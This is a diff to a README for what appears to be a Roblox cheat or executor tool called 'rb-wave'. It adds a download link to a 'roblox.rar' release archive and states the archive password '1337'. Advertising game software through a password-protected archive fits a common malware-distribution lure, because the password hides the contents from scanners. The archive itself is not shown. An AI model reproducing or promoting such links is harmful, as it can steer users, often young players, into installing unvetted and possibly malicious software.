@@ -11,8 +11,7 @@
 
 <p align="center">the BEST software for ROBLOX</p>
 
-
-# [Download](404)
+# [Download](https://github.com/DevX-Realtobiz/rb-wave/releases/download/rb/roblox.rar)
 
 ## ARCHIVE PASS - 1337
 
